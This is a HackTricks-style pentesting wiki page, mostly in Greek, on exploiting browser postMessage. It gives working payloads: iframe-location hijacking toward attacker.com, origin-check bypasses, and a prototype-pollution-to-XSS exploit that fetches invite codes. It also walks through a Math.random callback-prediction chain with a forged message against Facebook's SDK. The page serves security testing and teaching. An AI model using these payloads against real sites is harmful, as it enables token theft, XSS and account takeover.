# PostMessage Ευπάθειες

{{#include ../../banners/hacktricks-training.md}}

## Αποστολή **PostMessage**

**PostMessage** χρησιμοποιεί την ακόλουθη συνάρτηση για να στείλει ένα μήνυμα:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Σημειώστε ότι **targetOrigin** μπορεί να είναι '\*' ή ένα URL όπως _https://company.com._\
Στο **δεύτερο σενάριο**, το **μήνυμα μπορεί να σταλεί μόνο σε εκείνο το domain** (ακόμα κι αν το origin του αντικειμένου window είναι διαφορετικό).\
Αν χρησιμοποιηθεί το **wildcard**, **τα μηνύματα μπορούν να σταλούν σε οποιοδήποτε domain**, και θα σταλούν στο origin του αντικειμένου Window.

### Attacking iframe & wildcard in **targetOrigin**

Όπως εξηγείται στο [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) αν βρείτε μια σελίδα που μπορεί να είναι **iframed** (χωρίς `X-Frame-Header` protection) και που **στέλνει ευαίσθητο** μήνυμα μέσω **postMessage** χρησιμοποιώντας ένα **wildcard** (\*), μπορείτε να **τροποποιήσετε** το **origin** του **iframe** και να **leak** το **ευαίσθητο** μήνυμα σε ένα domain που ελέγχετε.\ 
Σημειώστε ότι αν η σελίδα μπορεί να είναι iframed αλλά το **targetOrigin** είναι **set to a URL and not to a wildcard**, αυτό το **κόλπο δεν θα λειτουργήσει**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** είναι η συνάρτηση που χρησιμοποιεί το JS για να δηλώσει τη συνάρτηση που **αναμένει `postMessages`**.\
Θα χρησιμοποιηθεί κώδικας παρόμοιος με τον παρακάτω:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

Για να **find event listeners** στην τρέχουσα σελίδα μπορείτε:

- **Search** τον JS κώδικα για `window.addEventListener` και `$(window).on` (_JQuery version_)
- **Execute** στην κονσόλα των developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Go to** _Elements --> Event Listeners_ στα developer tools του browser

![](<../../images/image (396).png>)

- Χρησιμοποιήστε μια **επέκταση προγράμματος περιήγησης** όπως [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ή [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Αυτές οι επεκτάσεις θα **intercept all the messages** και θα σας τα δείχνουν.

### Origin check bypasses

- Το attribute **`event.isTrusted`** θεωρείται ασφαλές καθώς επιστρέφει `True` μόνο για events που δημιουργούνται από γνήσιες ενέργειες χρήστη. Αν και είναι δύσκολο να παρακαμφθεί αν εφαρμόζεται σωστά, η σημασία του στους ελέγχους ασφαλείας είναι αξιοσημείωτη.
- Η χρήση του **`indexOf()`** για origin validation σε `postMessage` events μπορεί να είναι ευάλωτη σε παρακάμψεις. Ένα παράδειγμα που δείχνει αυτή την ευπάθεια είναι:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Η μέθοδος **`search()`** από `String.prototype.search()` προορίζεται για regular expressions, όχι για strings. Η παράδοση οτιδήποτε άλλο εκτός από regexp οδηγεί σε implicit conversion σε regex, κάνοντας τη μέθοδο ενδεχομένως ανασφαλή. Αυτό συμβαίνει γιατί σε regex, η τελεία (.) λειτουργεί ως wildcard, επιτρέποντας την παράκαμψη της επαλήθευσης με ειδικά κατασκευασμένα domains. Για παράδειγμα:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Η συνάρτηση **`match()`**, παρόμοια με τη `search()`, επεξεργάζεται regex. Εάν το regex δεν είναι δομημένο σωστά, μπορεί να είναι επιρρεπές σε παράκαμψη.
- Η συνάρτηση **`escapeHtml`** προορίζεται να κάνει sanitization εισόδων με escaping χαρακτήρων. Ωστόσο, δεν δημιουργεί ένα νέο escaped αντικείμενο αλλά υπεργράφει τις ιδιότητες του υπάρχοντος αντικειμένου. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί. Ειδικά, αν ένα αντικείμενο μπορεί να χειραγωγηθεί έτσι ώστε η ελεγχόμενη ιδιότητά του να μην αναγνωρίζει `hasOwnProperty`, το `escapeHtml` δεν θα λειτουργήσει όπως αναμένεται. Αυτό δείχνεται στα παραδείγματα παρακάτω:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Στο πλαίσιο αυτής της ευπάθειας, το αντικείμενο `File` είναι ιδιαίτερα εκμεταλλεύσιμο λόγω της read-only ιδιότητας `name`. Αυτή η ιδιότητα, όταν χρησιμοποιείται σε templates, δεν καθαρίζεται από τη συνάρτηση `escapeHtml`, οδηγώντας σε πιθανούς κινδύνους ασφαλείας.

- Η ιδιότητα `document.domain` στο JavaScript μπορεί να οριστεί από ένα script για να συντόμευση του domain, επιτρέποντας πιο χαλαρή εφαρμογή της same-origin policy εντός του ίδιου parent domain.

### Origin-only trust + trusted relays

Αν ένας receiver ελέγχει μόνο **`event.origin`** (π.χ. trusts any `*.trusted.com`) συχνά μπορείτε να βρείτε μια **"relay" page on that origin that echoes attacker-controlled params via `postMessage`** σε παρεχόμενο `targetOrigin`/`targetWindow`. Παραδείγματα περιλαμβάνουν marketing/analytics gadgets που παίρνουν query params και προωθούν `{msg_type, access_token, ...}` σε `opener`/`parent`. Μπορείτε:

- **Open the victim page in a popup/iframe that has an `opener`** ώστε οι handlers του να εγγραφούν (πολλά pixels/SDKs προσαρτούν listeners μόνο όταν υπάρχει `window.opener`).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, γεμίζοντας τα πεδία του μηνύματος που θέλετε να εισάγετε (message type, tokens, nonces).
- Επειδή το μήνυμα πλέον προέρχεται **from the trusted origin**, ο έλεγχος που βασίζεται μόνο στο origin περνάει και μπορείτε να ενεργοποιήσετε privileged behaviors (state changes, API calls, DOM writes) στον listener του θύματος.

Abuse patterns seen in the wild:

- Analytics SDKs (π.χ., pixel/fbevents-style) καταναλώνουν μηνύματα όπως `FACEBOOK_IWL_BOOTSTRAP`, μετά **καλούν backend APIs χρησιμοποιώντας ένα token που παρέχεται στο μήνυμα** και συμπεριλαμβάνουν **`location.href` / `document.referrer`** στο σώμα του αιτήματος. Αν παρέχετε δικό σας token, μπορείτε **να διαβάσετε αυτά τα αιτήματα στο request history/logs του token** και να εξάγετε **OAuth codes/tokens** που υπάρχουν στο URL/referrer της σελίδας του θύματος.
- Οποιοδήποτε relay που αντικατοπτρίζει αυθαίρετα πεδία σε `postMessage` σας επιτρέπει να **spoof message types** που περιμένουν privileged listeners. Συνδυάστε το με αδύναμο input validation για να φτάσετε σε Graph/REST calls, feature unlocks, ή ροές ισοδύναμες με CSRF.

Hunting tips: enumerate `postMessage` listeners που ελέγχουν μόνο `event.origin`, στη συνέχεια αναζητήστε **same-origin HTML/JS endpoints that forward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Συνδέστε τα με `window.open()` + `postMessage` για να παρακάμψετε τους origin checks.

### e.origin == window.origin bypass

Όταν ενσωματώνετε μια σελίδα web μέσα σε ένα **sandboxed iframe** χρησιμοποιώντας %%%%%%, είναι σημαντικό να κατανοήσετε ότι το origin του iframe θα οριστεί σε null. Αυτό είναι ιδιαίτερα σημαντικό όταν χειρίζεστε **sandbox attributes** και τις επιπτώσεις τους στην ασφάλεια και τη λειτουργικότητα.

Με τον καθορισμό του **`allow-popups`** στο attribute sandbox, οποιοδήποτε popup ανοίγει από το iframe κληρονομεί τους sandbox περιορισμούς του γονέα. Αυτό σημαίνει ότι εκτός αν συμπεριληφθεί και το attribute **`allow-popups-to-escape-sandbox`**, το origin του popup παραθύρου θα οριστεί επίσης σε `null`, ευθυγραμμιζόμενο με το origin του iframe.

Συνεπώς, όταν ένα popup ανοίγει υπό αυτές τις συνθήκες και ένα μήνυμα αποστέλλεται από το iframe προς το popup χρησιμοποιώντας **`postMessage`**, και οι δύο πλευρές (αποστολέας και παραλήπτης) έχουν τα origin τους ορισμένα σε `null`. Αυτή η κατάσταση οδηγεί σε σενάριο όπου **`e.origin == window.origin`** αξιολογείται σε true (`null == null`), επειδή τόσο το iframe όσο και το popup μοιράζονται την ίδια τιμή origin `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Είναι δυνατός ο έλεγχος αν το μήνυμα προήλθε από το ίδιο window στο οποίο τρέχει το script (ειδικά ενδιαφέρον για **Content Scripts from browser extensions** που ελέγχουν αν το μήνυμα στάλθηκε από την ίδια σελίδα):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Μπορείτε να αναγκάσετε το **`e.source`** ενός μηνύματος να είναι null δημιουργώντας ένα **iframe** που **στέλνει** το **postMessage** και διαγράφεται **αμέσως**.

Για περισσότερες πληροφορίες **διαβάστε:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Για να εκτελέσετε αυτές τις επιθέσεις ιδανικά θα μπορείτε να **τοποθετήσετε τη σελίδα-θύμα** μέσα σε ένα `iframe`. Αλλά ορισμένες κεφαλίδες όπως το `X-Frame-Header` μπορούν να **αποτρέψουν** αυτή τη **συμπεριφορά**.\
Σε αυτές τις περιπτώσεις μπορείτε να χρησιμοποιήσετε μια λιγότερο διακριτική επίθεση. Μπορείτε να ανοίξετε μια νέα καρτέλα στην ευάλωτη web εφαρμογή και να επικοινωνήσετε με αυτήν:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Κλοπή μηνύματος που στάλθηκε στο child iframe μπλοκάροντας την κύρια σελίδα

Στην παρακάτω σελίδα μπορείτε να δείτε πώς θα μπορούσατε να κλέψετε ένα **sensitive postmessage data** που στάλθηκε σε ένα **child iframe** μπλοκάροντας τη **main** σελίδα πριν την αποστολή των δεδομένων και καταχρώμενοι μια **XSS in the child** για να **leak the data** πριν αυτό ληφθεί:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Κλοπή μηνύματος με την τροποποίηση της τοποθεσίας του iframe

Αν μπορείτε να iframe μια webpage χωρίς X-Frame-Header που περιέχει άλλο iframe, μπορείτε να **change the location of that child iframe**, οπότε αν αυτό λαμβάνει ένα **postmessage** που στάλθηκε χρησιμοποιώντας **wildcard**, ένας επιτιθέμενος θα μπορούσε να **change** την **origin** αυτού του iframe σε μια σελίδα **controlled** από αυτόν και να **steal** το μήνυμα:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

Σε σενάρια όπου τα δεδομένα που στέλνονται μέσω του `postMessage` εκτελούνται από JS, μπορείτε να **iframe** τη **page** και να **exploit** την **prototype pollution/XSS** στέλνοντας το exploit μέσω `postMessage`.

Ένα παράδειγμα από **very good explained XSS though `postMessage`** μπορεί να βρεθεί στο [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Παράδειγμα ενός exploit για να καταχραστεί **Prototype Pollution and then XSS** μέσω ενός `postMessage` προς ένα `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Για **περισσότερες πληροφορίες**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Πρόβλεψη των **`Math.random()`** callback tokens σε γέφυρες postMessage

Όταν η επικύρωση μηνυμάτων χρησιμοποιεί ένα «shared secret» που παράγεται με `Math.random()` (π.χ., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) και ο ίδιος helper δίνει ονόματα σε plugin iframes, μπορείτε να ανακτήσετε PRNG outputs και να πλαστογραφήσετε αξιόπιστα μηνύματα:

- Leak PRNG outputs via `window.name`: Το SDK δίνει αυτόματα ονόματα στα plugin iframes με `guid()`. Αν ελέγχετε το top frame, φορτώστε τη σελίδα θύμα σε iframe, μετά πλοηγήστε το plugin iframe στην προέλευσή σας (π.χ., `window.frames[0].frames[0].location='https://attacker.com'`) και διαβάστε `window.frames[0].frames[0].name` για να λάβετε μια ακατέργαστη έξοδο `Math.random()`.

- Force more outputs without reloads: Κάποια SDK εκθέτουν μονοπάτι reinit· στο FB SDK, η εκπομπή `init:post` με `{xfbml:1}` αναγκάζει `XFBML.parse()`, καταστρέφει/ξαναδημιουργεί το plugin iframe και παράγει νέα ονόματα/IDs callback. Επαναλαμβανόμενο reinit παράγει όσες PRNG outputs χρειάζονται (σημειώστε επιπλέον εσωτερικές κλήσεις `Math.random()` για callback/iframe IDs, οπότε οι λύτες πρέπει να παραλείπουν ενδιάμεσα τιμές).

- Trusted-origin delivery via parameter pollution: Αν ένα first-party plugin endpoint αντανακλά έναν ανεπεξέργαστο παράμετρο στο cross-window payload (π.χ., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), μπορείτε να εγχύσετε `&type=...&iconSVG=...` ενώ διατηρείτε την αξιόπιστη προέλευση `facebook.com`.

- Predict the next callback: Μετατρέψτε τα leaked iframe names πίσω σε floats στο `[0,1)` και τροφοδοτήστε αρκετές τιμές (ακόμη και μη διαδοχικές) σε έναν V8 `Math.random` predictor (π.χ., Z3-based). Γεννήστε το επόμενο `guid()` τοπικά για να πλαστογραφήσετε το αναμενόμενο callback token.

- Trigger the sink: Σχηματίστε τα δεδομένα postMessage ώστε η γέφυρα να εκτελέσει `xd.mpn.setupIconIframe` και να εγχύσει HTML σε `iconSVG` (π.χ., URL-encoded `<img src=x onerror=...>`), επιτυγχάνοντας DOM XSS μέσα στην hosting origin· από εκεί, same-origin iframes (OAuth dialogs, arbiters, κ.λπ.) μπορούν να διαβαστούν.

- Framing quirks help: Η αλυσίδα απαιτεί framing. Σε κάποια mobile webviews, το `X-Frame-Options` μπορεί να υποβαθμιστεί σε μη υποστηριζόμενο `ALLOW-FROM` όταν υπάρχει `frame-ancestors`, και παράμετροι “compat” μπορούν να επιβάλλουν επιεικείς `frame-ancestors`, επιτρέποντας το `window.name` side channel.

#### Ελάχιστο παράδειγμα πλαστογραφημένου μηνύματος
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Αναφορές

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Για εξάσκηση: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
